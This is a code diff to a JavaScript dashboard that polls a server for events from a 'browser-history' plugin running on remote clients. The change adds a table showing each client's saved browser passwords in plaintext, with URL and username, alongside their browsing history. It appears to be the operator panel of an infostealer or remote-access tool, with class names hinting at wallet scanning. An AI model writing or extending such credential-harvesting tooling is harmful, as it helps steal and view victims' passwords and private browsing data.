@@ -1,10 +1,12 @@
 const params = new URLSearchParams(window.location.search);
-const clientIdInput = document.getElementById("client-id");
-const scanBtn = document.getElementById("scan-btn");
-const statusPill = document.getElementById("status-pill");
-const countBadge = document.getElementById("count-badge");
-const resultsArea = document.getElementById("results-area");
-const logEl = document.getElementById("log");
+const clientIdInput   = document.getElementById("client-id");
+const scanBtn         = document.getElementById("scan-btn");
+const statusPill      = document.getElementById("status-pill");
+const countBadge      = document.getElementById("count-badge");
+const pwdCountBadge   = document.getElementById("pwd-count-badge");
+const resultsArea     = document.getElementById("results-area");
+const passwordsArea   = document.getElementById("passwords-area");
+const logEl           = document.getElementById("log");
 
 const pluginId = "browser-history";
 const clientId = params.get("clientId") || "";
@@ -19,7 +21,7 @@ function log(line) {
   logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
 }
 
-// ─── Status pill helpers ───────────────────────────────────────────────────────
+// ─── Status pill ──────────────────────────────────────────────────────────────
 
 function setStatus(text, cls) {
   statusPill.textContent = text;
@@ -51,10 +53,7 @@ async function pollEvents() {
       `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`,
       { method: "GET" }
     );
-    if (!res.ok) {
-      log(`poll failed: ${res.status}`);
-      return;
-    }
+    if (!res.ok) { log(`poll failed: ${res.status}`); return; }
     const data = await res.json();
     for (const item of data.events || []) {
       handleIncomingEvent(item.event, item.payload);
@@ -64,7 +63,7 @@ async function pollEvents() {
   }
 }
 
-// ─── Render results ────────────────────────────────────────────────────────────
+// ─── Helpers ──────────────────────────────────────────────────────────────────
 
 function escapeHtml(str) {
   return String(str)
@@ -75,14 +74,62 @@ function escapeHtml(str) {
 }
 
 function extractDomain(url) {
-  try {
-    return new URL(url).hostname.replace(/^www\./, "");
-  } catch (_) {
-    return url;
-  }
+  try { return new URL(url).hostname.replace(/^www\./, ""); }
+  catch (_) { return url; }
 }
 
-function renderResults(entries, scannedAt, total) {
+function groupByFirstLetter(items, keyFn) {
+  const groups = {};
+  for (const item of items) {
+    const letter = (keyFn(item)[0] || "#").toUpperCase();
+    if (!groups[letter]) groups[letter] = [];
+    groups[letter].push(item);
+  }
+  return groups;
+}
+
+// ─── Render passwords ─────────────────────────────────────────────────────────
+
+function renderPasswords(passwords, total) {
+  pwdCountBadge.textContent = String(total);
+  pwdCountBadge.classList.toggle("hidden", total === 0);
+
+  if (total === 0) {
+    passwordsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved passwords found.</p>`;
+    return;
+  }
+
+  const groups = groupByFirstLetter(passwords, (p) => extractDomain(p.url));
+  const letters = Object.keys(groups).sort();
+  let html = "";
+
+  for (const letter of letters) {
+    const items = groups[letter];
+    const rows = items.map((p) => `<tr>
+      <td class="url-cell">${escapeHtml(p.url)}</td>
+      <td class="title-cell">${escapeHtml(p.username)}</td>
+      <td class="password-cell">${escapeHtml(p.password)}</td>
+      <td class="source-cell">${escapeHtml(p.source)}</td>
+    </tr>`).join("");
+
+    html += `
+      <div class="category-group">
+        <div class="category-title cat-pwd">
+          <span class="cat-dot"></span>${escapeHtml(letter)} (${items.length})
+        </div>
+        <table class="wallet-table">
+          <thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr></thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </div>`;
+  }
+
+  passwordsArea.innerHTML = html;
+}
+
+// ─── Render history ───────────────────────────────────────────────────────────
+
+function renderResults(entries, total) {
   countBadge.textContent = String(total);
   countBadge.classList.toggle("hidden", total === 0);
 
@@ -91,29 +138,17 @@ function renderResults(entries, scannedAt, total) {
     return;
   }
 
-  // Group by first letter of domain
-  const groups = {};
-  for (const e of entries) {
-    const domain = extractDomain(e.url);
-    const letter = (domain[0] || "#").toUpperCase();
-    if (!groups[letter]) groups[letter] = [];
-    groups[letter].push(e);
-  }
-
+  const groups = groupByFirstLetter(entries, (e) => extractDomain(e.url));
   const letters = Object.keys(groups).sort();
   let html = "";
 
   for (const letter of letters) {
     const items = groups[letter];
-    const rows = items
-      .map(
-        (e) => `<tr>
-          <td class="url-cell"><a href="${escapeHtml(e.url)}" target="_blank" rel="noopener noreferrer">${escapeHtml(e.url)}</a></td>
-          <td class="title-cell">${escapeHtml(e.title || "")}</td>
-          <td class="source-cell">${escapeHtml(e.source)}</td>
-        </tr>`
-      )
-      .join("");
+    const rows = items.map((e) => `<tr>
+      <td class="url-cell"><a href="${escapeHtml(e.url)}" target="_blank" rel="noopener noreferrer">${escapeHtml(e.url)}</a></td>
+      <td class="title-cell">${escapeHtml(e.title || "")}</td>
+      <td class="source-cell">${escapeHtml(e.source)}</td>
+    </tr>`).join("");
 
     html += `
       <div class="category-group">
@@ -130,27 +165,30 @@ function renderResults(entries, scannedAt, total) {
   resultsArea.innerHTML = html;
 }
 
-// ─── Handle incoming plugin events ────────────────────────────────────────────
+// ─── Handle incoming events ───────────────────────────────────────────────────
 
 function handleIncomingEvent(event, payload) {
   if (event === "ready") {
-    log("Plugin ready on client — auto-scan started");
+    log("Plugin ready on client \u2014 auto-scan started");
     setStatus("Scanning\u2026", "status-scanning");
   } else if (event === "history_result") {
     stopPolling();
-    const total = payload?.total ?? 0;
-    const entries = payload?.entries ?? [];
+    const total     = payload?.total ?? 0;
+    const pwdTotal  = payload?.passwordTotal ?? 0;
+    const entries   = payload?.entries ?? [];
+    const passwords = payload?.passwords ?? [];
     const scannedAt = payload?.scannedAt ?? "";
 
-    log(`Scan complete at ${scannedAt} — ${total} URL(s) found`);
+    log(`Scan complete at ${scannedAt} \u2014 ${total} URL(s), ${pwdTotal} password(s)`);
 
-    if (total > 0) {
-      setStatus(`${total} URL(s) found`, "status-found");
+    if (total > 0 || pwdTotal > 0) {
+      setStatus(`${total} URL(s) \u00B7 ${pwdTotal} password(s)`, "status-found");
     } else {
-      setStatus("No history found", "status-clean");
+      setStatus("Nothing found", "status-clean");
     }
 
-    renderResults(entries, scannedAt, total);
+    renderPasswords(passwords, pwdTotal);
+    renderResults(entries, total);
     scanBtn.disabled = false;
   } else {
     log(`Event: ${event} \u2192 ${JSON.stringify(payload)}`);
@@ -166,19 +204,13 @@ function startPolling() {
 }
 
 function stopPolling() {
-  if (pollTimer !== null) {
-    clearInterval(pollTimer);
-    pollTimer = null;
-  }
+  if (pollTimer !== null) { clearInterval(pollTimer); pollTimer = null; }
 }
 
 // ─── Scan button ──────────────────────────────────────────────────────────────
 
 scanBtn.addEventListener("click", async () => {
-  if (!clientId) {
-    log("No clientId in URL");
-    return;
-  }
+  if (!clientId) { log("No clientId in URL"); return; }
   scanBtn.disabled = true;
   setStatus("Scanning\u2026", "status-scanning");
   log("Manual scan triggered");
@@ -189,7 +221,7 @@ scanBtn.addEventListener("click", async () => {
 // ─── Init ─────────────────────────────────────────────────────────────────────
 
 if (!clientId) {
-  log("No clientId provided in URL — open this page from a client context");
+  log("No clientId provided in URL \u2014 open this page from a client context");
   setStatus("No client selected", "status-idle");
 } else {
   log(`Client: ${clientId}`);
